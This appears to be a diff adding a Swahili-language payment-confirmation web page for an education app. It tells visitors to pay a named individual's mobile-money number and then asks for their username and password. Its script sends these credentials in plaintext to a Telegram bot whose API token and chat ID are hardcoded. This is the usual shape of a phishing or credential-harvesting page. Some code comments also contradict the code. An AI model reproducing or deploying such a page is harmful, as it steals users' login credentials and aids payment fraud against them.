@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment Form</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/27/Bus_rapid_transit_in_Dar_es_Salaam%2C_Tanzania.jpg'); /* Default background image */
+ background-size: cover;
+  background-repeat: no-repeat;
+  background-position: center; */
+  }
+  .container {
+    max-width: 400px;
+    margin: auto;
+    padding: 20px;
+    background-color: rgba(255, 255, 255, 0.9);
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.9);
+  }
+  .head {
+    text-align: center;
+  }
+  .form-container {
+    max-width: 400px;
+    margin: auto;
+  }
+  label {
+    font-weight: bold;
+  }
+  input[type="text"],
+  input[type="password"],
+  select {
+    width: 100%;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    background-color: #2C86E9;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: green;
+  }
+  .taarifa {
+    background-color: #f3f3f3;
+    padding: 15px;
+    border-radius: 5px;
+  }
+  input[type="button"] {
+    width: 100%;
+    background-color: #ddd;
+    color: black;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  input[type="button"]:hover {
+    background-color: #bfbfbf;
+  }
+
+
+   .button1 {
+    width: 100%;
+    background-color: red;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  .button1:hover {
+    background-color: #245eea;
+  }
+</style>
+</head>
+<body>
+    <br><br><br><br><br><br><br><br><br><br><br><br>
+
+<div class="container" id="payment-form">
+  <br>
+  <h2 style="color: #2C86E9;" class="head"><i class="fas fa-credit-card"></i> Thibitisha Malipo yako</h2>
+  <form id="payment-form" class="form-container" >
+    <br>
+    <div class="taarifa" style="margin-bottom: 25px;"><b>Hujambo..</b> <br> Nambari ifuatayo ya kulipia kifurushi.<br><br> <b>Nambari ya simu:</b> 255719834465<br> <b>Jina:</b> HENOCK MWANANJELA<br><b>Mtandao:</b> Tigo<br><br> <b>Kumbuka:</b> Lipa kiasi sahihi kulingana na kiasi unachotaka, usiongeze wala usipunguze, pia zingatia kuingiza taarifa sahihi username na password.<br>Lipia kwanza ndo ujaze fomu hii ili kupata huduma sahihi<br> Asante..!</div>
+    <br><br><br>
+    
+    <label for="payer-code">USERNAME:</label>
+    <input type="text" id="payer-code" name="payer-code" oninput="this.value = this.value.toUpperCase()" required>
+
+    <label for="payment-number">PASSWORD:</label>
+    <input type="password" id="payment-number" name="payment-number" required>
+
+    <label for="reference-number">KUMBUKUMBU NAMBA:</label>
+    <input type="text" id="reference-number" name="reference-number" required>
+
+    <label for="network">MTANDAO ULIO LIPIA:</label>
+    <select id="network" name="network" required>
+      <option value="M-PESA">M-PESA</option>
+      <option value="TIGOPESA">TIGOPESA</option>
+      <option value="HALOPESA">HALOPESA</option>
+      <option value="AIRTEL-MONEY">AIRTEL-MONEY</option>
+      <!-- Add more network options as needed -->
+    </select>
+
+    <label for="package-level">AINA YA KIFURUSHI:</label>
+    <select id="package-level" name="package-level" onchange="updatePrice()" required>
+      <option value="1">Tap to select a package</option>
+      <option value="1-wiki">1 WIKI</option>
+      <option value="1-mwezi">MWEZI 1</option>
+      <option value="2-mwezi">MIEZI 2</option>
+      <option value="3-mwezi">MIEZI 3</option>
+      <option value="4-mwezi">MIEZI 4</option>
+    </select>
+
+    <label for="price"><b>select a package</b></label>
+    <b><span style="color:red" id="price-display">select a package level to see the paid rate.</span></b>
+    <br><br><br>
+    <button type="submit"><b><i class="fas fa-paper-plane"></i> Tuma taarifa za malipo</b></button><br>
+    <br>
+  </form>
+  <button class="button1" type="button" value="Back" onclick="showLoginForm()"><i class="fas fa-arrow-left"></i> Back</button> 
+</div><br><br><br><br><br><br><br><br>
+
+<script>
+  function showLoginForm() {
+    // Function to go back to the login form or previous page
+    // You can implement your logic here
+    // For demonstration, just alerting
+    alert("Implement your logic to go back to the login form or previous page");
+  }
+
+    function showPayment() {
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("payment-form").style.display = "block";
+        setTimeout(function() {
+            document.getElementById("payment-form").style.display = "none";
+            document.getElementById("loginForm").style.display = "block";
+        }, 60000); // Return to login form after 7 seconds
+    }
+
+     function updatePrice() {
+            const packageLevel = document.getElementById('package-level').value;
+            let price;
+
+            // Set prices based on the selected package level
+            switch (packageLevel) {
+                case '0':
+                    price = 0; // Set your price for 1 month
+                    break;
+                case '1-wiki':
+                    price = 1; // Set your price for 1 week
+                    break;
+                case '1-mwezi':
+                    price = 3; // Set your price for 1 month
+                    break;
+                case '2-mwezi':
+                    price = 6; // Set your price for 2 months
+                    break;
+                case '3-mwezi':
+                    price = 9; // Set your price for 3 months
+                    break;
+                case '4-mwezi':
+                    price = 12; // Set your price for 4 months
+                    break;
+
+            }
+
+            document.getElementById('price-display').textContent = `Price: Tsh. ${price},000/=`;
+        }
+
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Get form data
+            const payerCode = document.getElementById('payer-code').value;
+            const paymentNumber = document.getElementById('payment-number').value;
+            const referenceNumber = document.getElementById('reference-number').value;
+            const selectedNetwork = document.getElementById('network').value;
+            const selectedPackage = document.getElementById('package-level').value;
+            const selectedPrice = document.getElementById('price-display').textContent;
+             
+
+            // Construct message for Telegram
+            const message = `*TAARIFA YA MALIPO ELIMU APP*\n\n*Username:* ${payerCode}\n*Password:* ${paymentNumber}\n*Kumbu namba:* ${referenceNumber}\n*Network:* ${selectedNetwork}\n*Package:* ${selectedPackage}\n*${selectedPrice}*\n\n✍️ _By SMGAi Elimu app payment_`;
+
+            // Replace the URL with your Telegram bot API endpoint
+            const telegramBotAPI = 'https://api.telegram.org/bot6755944681:AAHt79bxx56EHxe4W2ZWzsxTcHRY6Ix8OhU/sendMessage';
+            const params = {
+                chat_id: '5479041930', // Replace with your chat ID
+                text: message,
+                parse_mode: 'Markdown',
+                disable_notification: false // Sending silently
+            };
+
+            // Send message to Telegram
+            fetch(telegramBotAPI, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            }).then(response => {
+                if (response.ok) {
+                    alert('✅ Order placed successfully!');
+                } else {
+                    alert('❌ Imeshindwa kuagiza. Tafadhali jaribu tena baadaye, username sahihi.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('❌ Imeshindwa kuagiza. Tafadhali jaribu tena baadae.');
+            });
+        });
+
+
+
+</script>
+
+</body>
+</html>
